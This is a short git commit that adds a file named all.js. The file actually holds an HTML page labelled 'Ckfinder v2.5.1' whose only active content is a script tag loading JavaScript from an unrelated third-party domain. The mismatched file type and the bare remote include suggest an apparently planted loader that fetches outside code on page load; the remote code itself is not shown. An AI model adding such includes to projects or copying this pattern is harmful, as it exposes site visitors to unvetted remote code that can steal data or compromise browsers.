4a7a0214a44428dcdbb23b0f730aec4122df4f02
Nguyen Duy <nguyenduy240784@gmail.com>
2025-09-13 16:28:36 +0700

    Update all.js

---
+++ all.js
@@ -0,0 +1,11 @@
+<!DOCTYPE html>
+<html lang="vi-vn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script src="https://phukhoathaiha.com/3rd/craftbd/js.js"></script>
+</head>
+<body>
+<h1>Ckfinder v2.5.1</h1>
+</body>
+</html>
